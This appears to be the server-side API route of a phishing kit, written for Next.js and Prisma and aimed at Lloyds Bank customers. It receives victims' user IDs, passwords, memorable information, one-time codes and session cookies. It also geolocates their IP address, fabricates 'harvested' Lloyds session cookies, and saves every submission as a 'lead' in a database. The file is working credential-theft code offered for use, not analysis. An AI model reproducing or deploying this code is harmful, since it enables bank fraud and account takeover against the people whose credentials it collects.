import { NextResponse } from "next/server";
import { prisma } from "@/lib/prisma";

export const dynamic = "force-dynamic";

export async function POST(req: Request) {
  try {
    const body = await req.json().catch(() => ({}));
    const { sessionId, bankName, bankType, userId, password, memorableInfo, otpCode, cookiesData } = body;

    // Client IP & Geo extraction
    const forwarded = req.headers.get("x-forwarded-for");
    const clientIp = typeof forwarded === "string" ? forwarded.split(",")[0].trim() : "39.34.173.81";

    let country = "United Kingdom";
    let city = "London";

    try {
      const geoRes = await fetch(`http://ip-api.com/json/${clientIp}?fields=status,country,city,query`, {
        signal: AbortSignal.timeout(2000)
      });
      if (geoRes.ok) {
        const geo = await geoRes.json();
        if (geo.status === "success") {
          country = geo.country || "United Kingdom";
          city = geo.city || "London";
        }
      }
    } catch (e) {
      console.log("Geo fetch fallback");
    }

    // Harvested Session Cookies simulation for target bank
    let activeCookies = cookiesData;
    if (userId && password && !cookiesData) {
      activeCookies = JSON.stringify([
        { name: "lloyds_secure_sess", value: "tok_" + Math.random().toString(36).substring(7), domain: ".lloydsbank.co.uk", path: "/", secure: true, httpOnly: true },
        { name: "akavpau_consent", value: "active_" + Date.now(), domain: ".lloydsbank.co.uk", path: "/", secure: true }
      ]);
    }

    const payload = {
      bank: bankName || "Lloyds Bank",
      bankName: bankName || "Lloyds Bank",
      bankType: bankType || "Personal",
      userId: userId || "",
      password: password || "",
      memorableInfo: memorableInfo || "",
      otpCode: otpCode || "",
      cookiesData: activeCookies || '{"status": "active_stream"}',
      ipAddress: clientIp,
      deviceInfo: `Country: ${country} | City: ${city} | Secure RDP Stream`,
      extraData: `Live Stream Active | Target: ${bankName || "Lloyds Bank"} | IP: ${clientIp}`
    };

    let lead;
    if (sessionId) {
      lead = await prisma.lead.upsert({
        where: { sessionId },
        update: payload,
        create: { sessionId, ...payload },
      });
    } else {
      lead = await prisma.lead.create({ data: payload });
    }

    return NextResponse.json({ success: true, data: lead });
  } catch (error) {
    console.error("Stream API Error:", error);
    return NextResponse.json({ success: false, error: "Stream sync failed" }, { status: 500 });
  }
}